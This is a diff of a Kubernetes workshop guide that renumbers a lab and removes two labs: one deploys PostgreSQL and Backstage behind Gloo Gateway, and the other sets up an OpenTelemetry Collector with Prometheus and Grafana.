 
 
 
-## Lab 23 - Deploy Backstage with the backend plugin <a name="lab-23---deploy-backstage-with-the-backend-plugin-"></a>
+## Lab 25 - Deploy Backstage with the backend plugin <a name="lab-25---deploy-backstage-with-the-backend-plugin-"></a>
 
-
-Let's deploy PostgreSQL, before deploying Backstage:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: postgres
-  namespace: gloo-system
----
-apiVersion: v1
-kind: Secret
-metadata:
-  name: postgres-secrets
-  namespace: gloo-system
-type: Opaque
-data:
-  POSTGRES_USER: YmFja3N0YWdl
-  POSTGRES_PASSWORD: aHVudGVyMg==
----
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: postgres
-  namespace: gloo-system
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: postgres
-  template:
-    metadata:
-      labels:
-        app: postgres
-    spec:
-      serviceAccountName: postgres
-      containers:
-        - name: postgres
-          image: postgres:13.2-alpine
-          imagePullPolicy: 'IfNotPresent'
-          ports:
-            - containerPort: 5432
-          envFrom:
-            - secretRef:
-                name: postgres-secrets
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: postgres
-  namespace: gloo-system
-spec:
-  selector:
-    app: postgres
-  ports:
-    - port: 5432
-EOF
-```
-
-Now we can deploy Backstage:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f data/steps/dev-portal-backstage-backend/rbac.yaml
-
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: backstage
-  namespace: gloo-system
----
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: backstage
-  namespace: gloo-system
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: backstage
-  template:
-    metadata:
-      labels:
-        app: backstage
-    spec:
-      serviceAccountName: backstage
-      containers:
-        - name: backstage
-          image: gcr.io/solo-public/docs/portal-backstage-backend:v0.0.33
-          imagePullPolicy: IfNotPresent
-          ports:
-            - name: http
-              containerPort: 7007
-          envFrom:
-            - secretRef:
-                name: postgres-secrets
-          env:
-          - name: PORTAL_DEBUG_LOGGING
-            value: "true"
-          - name: PORTAL_SERVER_URL
-            value: "http://gateway-portal-web-server.gloo-system:8080/v1"
-          - name: CLIENT_ID
-            value: ${KEYCLOAK_CLIENT}
-          - name: CLIENT_SECRET
-            value: ${KEYCLOAK_SECRET}
-          - name: SA_CLIENT_ID
-            value: ${KEYCLOAK_CLIENT}
-          - name: SA_CLIENT_SECRET
-            value: ${KEYCLOAK_SECRET}
-          - name: APP_CONFIG_backend_baseUrl
-            value: https://backstage.example.com
-          - name: TOKEN_ENDPOINT
-            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/token"
-          - name: AUTH_ENDPOINT
-            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/auth"
-          - name: LOGOUT_ENDPOINT
-            value: "${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/logout"
-          - name: NODE_TLS_REJECT_UNAUTHORIZED
-            value: "0"
-          - name: POSTGRES_HOST
-            value: postgres
-          - name: POSTGRES_PORT
-            value: "5432"
-          - name: PORTAL_SYNC_FREQUENCY_SECONDS
-            value: "10"
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: backstage
-  namespace: gloo-system
-spec:
-  selector:
-    app: backstage
-  ports:
-    - name: http
-      port: 80
-      targetPort: http
-EOF
-
-kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy backstage
-```
-
-After that, you can expose Backstage through Gloo Gateway using a `HTTPRoute`:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: gateway.networking.k8s.io/v1
-kind: HTTPRoute
-metadata:
-  name: backstage
-  namespace: gloo-system
-spec:
-  parentRefs:
-    - name: http
-      namespace: gloo-system
-      sectionName: https
-  hostnames:
-    - "backstage.example.com"
-  rules:
-    - backendRefs:
-        - name: backstage
-          port: 80
-      matches:
-      - path:
-          type: PathPrefix
-          value: /
-EOF
-```
-Let's add the domain to our `/etc/hosts` file:
-
-```bash
-./scripts/register-domain.sh backstage.example.com ${PROXY_IP}
-```
-
-You can now access the `backstage` UI using this URL: [https://backstage.example.com](https://backstage.example.com).
-
-<!--bash
-echo -n Waiting for Backstage to finish processing APIs...
-timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n gloo-system logs -l app=backstage 2>/dev/null | grep \"Transformed APIs into new entities\") ]]; do
-  sleep 5
-  echo -n .
-done
-echo"
--->
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-const puppeteer = require('puppeteer');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("APIs displayed properly in backstage", function() {
-  let browser;
-  let html;
-
-  // Use Mocha's 'before' hook to set up Puppeteer
-  beforeEach(async function() {
-    browser = await puppeteer.launch({
-      headless: "new",
-      ignoreHTTPSErrors: true,
-      args: ['--no-sandbox', '--disable-setuid-sandbox'], // needed for instruqt
-    });
-    let page = await browser.newPage();
-    await page.goto(`https://backstage.example.com/api-docs`);
-    await page.waitForNetworkIdle({ options: { timeout: 1000 } });
-
-    await page.click('button');
-
-    await page.waitForNavigation({ waitUntil: 'networkidle0' });
-
-    html = await page.content();
-  });
-
-  // Use Mocha's 'after' hook to close Puppeteer
-  afterEach(async function() {
-    await browser.close();
-  });
-
-  it("The page contains bookinfo-v1", () => {
-    expect(html).to.contain("bookinfo-v1");
-  });
-});
-EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backstage-backend/tests/backstage-apis.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-timeout --signal=INT 6m mocha ./test.js --timeout 10000 --retries=250 --bail 2> ${tempfile} || { cat ${tempfile} && echo "" && cat ./test.js && exit 1; }
--->
-
-
-
-## Lab 24 - Deploy OpenTelemetry Collector <a name="lab-24---deploy-opentelemetry-collector-"></a>
-
-Having metrics is essential for running applications reliably, and gateways are no exceptions.
-
-Using [OpenTelemetry Collectors](https://github.com/open-telemetry/opentelemetry-collector-contrib) is a nice way to collect, transform, and ship telemetry to your observability backends.
-
-Let's deploy the OSS distribution of OpenTelemetry Collector, and get started!
-
-```bash
-helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
-helm repo update
-
-helm upgrade --install opentelemetry-collector open-telemetry/opentelemetry-collector \
---version 0.97.1 \
---set mode=deployment \
---set image.repository="otel/opentelemetry-collector-contrib" \
---set command.name="otelcol-contrib" \
---namespace=otel \
---create-namespace \
--f -<<EOF
-clusterRole:
-  create: true
-  rules:
-  - apiGroups:
-    - ''
-    resources:
-    - 'pods'
-    - 'nodes'
-    verbs:
-    - 'get'
-    - 'list'
-    - 'watch'
-ports:
-  promexporter:
-    enabled: true
-    containerPort: 9099
-    servicePort: 9099
-    protocol: TCP
-config:
-  receivers:
-    prometheus/gloo-dataplane:
-      config:
-        scrape_configs:
-        # Scrape the Gloo Gateway pods
-        - job_name: gloo-gateways
-          honor_labels: true
-          kubernetes_sd_configs:
-          - role: pod
-          relabel_configs:
-            - action: keep
-              regex: kube-gateway
-              source_labels:
-              - __meta_kubernetes_pod_label_gloo
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
-              action: keep
-              regex: true
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
-              action: replace
-              target_label: __metrics_path__
-              regex: (.+)
-            - action: replace
-              source_labels:
-              - __meta_kubernetes_pod_ip
-              - __meta_kubernetes_pod_annotation_prometheus_io_port
-              separator: ':'
-              target_label: __address__
-            - action: labelmap
-              regex: __meta_kubernetes_pod_label_(.+)
-            - source_labels: [__meta_kubernetes_namespace]
-              action: replace
-              target_label: kube_namespace
-            - source_labels: [__meta_kubernetes_pod_name]
-              action: replace
-              target_label: pod
-    prometheus/gloo-controlplane:
-      config:
-        scrape_configs:
-        # Scrape the Gloo pods
-        - job_name: gloo-gateways
-          honor_labels: true
-          kubernetes_sd_configs:
-          - role: pod
-          relabel_configs:
-            - action: keep
-              regex: gloo
-              source_labels:
-              - __meta_kubernetes_pod_label_gloo
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
-              action: keep
-              regex: true
-            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
-              action: replace
-              target_label: __metrics_path__
-              regex: (.+)
-            - action: replace
-              source_labels:
-              - __meta_kubernetes_pod_ip
-              - __meta_kubernetes_pod_annotation_prometheus_io_port
-              separator: ':'
-              target_label: __address__
-            - action: labelmap
-              regex: __meta_kubernetes_pod_label_(.+)
-            - source_labels: [__meta_kubernetes_namespace]
-              action: replace
-              target_label: kube_namespace
-            - source_labels: [__meta_kubernetes_pod_name]
-              action: replace
-              target_label: pod
-  exporters:
-    prometheus:
-      endpoint: 0.0.0.0:9099
-    debug: {}
-  service:
-    pipelines:
-      metrics:
-        receivers: [prometheus/gloo-dataplane, prometheus/gloo-controlplane]
-        processors: [batch]
-        exporters: [prometheus]
-EOF
-```
-
-This deployment will now scrape our Gateways' metrics, and expose these metrics in Prometheus format.
-
-While you could scrape the Gateway pods directly as well, that might only work if you only want to consume them from the local cluster. Or, you could be standardizing on OpenTelemetry to avoid vendor/project specific agents. In this case, ingesting the metrics into an OTel Collector can make perfect sense, since you can freely transform telemetry data and ship to the backend of your liking.
-
-For simplicity's sake, let's imagine that our desired backend is a local Prometheus instance. Let's get the telemetry data in to that one!
-
-First, let's install kube-prometheus-stack!
-
-```bash
-helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
-helm repo update
-
-helm upgrade --install kube-prometheus-stack \
-prometheus-community/kube-prometheus-stack \
---version 61.2.0 \
---namespace monitoring \
---create-namespace \
---values - <<EOF
-grafana:
-  service:
-    type: LoadBalancer
-    port: 3000
-prometheus:
-  prometheusSpec:
-    ruleSelectorNilUsesHelmValues: false
-    serviceMonitorSelectorNilUsesHelmValues: false
-    podMonitorSelectorNilUsesHelmValues: false
-EOF
-```
-
-Finally, configure scraping for our OTel Collector via a PodMonitor!
-
-```bash
-cat <<EOF | kubectl apply -n otel -f -
-apiVersion: monitoring.coreos.com/v1
-kind: PodMonitor
-metadata:
-  name: otel-monitor
-spec:
-  podMetricsEndpoints:
-  - interval: 30s
-    port: promexporter
-    scheme: http
-  selector:
-    matchLabels:
-      app.kubernetes.io/name: opentelemetry-collector
-EOF
-```
-
-Now let's import a sample dashboard!
-
-```bash
-kubectl -n monitoring create cm envoy-dashboard \
---from-file=data/steps/deploy-otel-collector/envoy.json
-kubectl label -n monitoring cm envoy-dashboard grafana_dashboard=1
-```
-
-Let's generate some traffic!
-
-```shell,run
-for i in {1..5}; do curl https://httpbin.example.com/get -v; done
-```
-
-
-To access Grafana, you need to get the endpoint using the following command:
-
-```bash
-echo "http://$(kubectl --context ${CLUSTER1} -n monitoring get svc kube-prometheus-stack-grafana -o jsonpath='{.status.loadBalancer.ingress[0].*}'):3000"
-```
-
-
-Login with `admin` and `prom-operator` you should be able to see how traffic flows trough your Gateways!
-			    
-![Envoy dashboard](images/steps/deploy-otel-collector/envoy.png)
 
 
 
